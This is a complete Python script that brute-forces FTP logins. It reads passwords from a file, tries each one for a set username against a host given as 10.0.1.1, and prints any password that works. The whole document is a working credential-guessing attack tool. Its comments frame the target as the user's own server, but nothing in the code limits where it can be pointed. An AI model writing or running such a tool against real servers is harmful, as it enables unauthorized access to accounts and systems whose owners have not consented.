import ftplib
import time

def brute_force_ftp(ip, port, username, password_file):
    ftp = ftplib.FTP()
    with open(password_file, 'r') as file:
        passwords = file.readlines()

    for password in passwords:
        password = password.strip()
        try:
            print(f"Trying {username}:{password}")
            ftp.connect(ip, port, timeout=10)
            ftp.login(username, password)
            print(f"Success! Username: {username}, Password: {password}")
            ftp.quit()
            return
        except ftplib.error_perm:
            print(f"Failed {username}:{password}")
        except Exception as e:
            print(f"Error: {str(e)}")
            continue

    print("Brute force attack finished. No valid credentials found.")

if __name__ == "__main__":
    ip = "10.0.1.1"  # Replace with the IP address of your FTP server
    port = 21  # FTP port (default is 21)
    username = "testuser"  # Replace with the username you want to test
    password_file = "passwords.txt"  # Path to the password file

    brute_force_ftp(ip, port, username, password_file)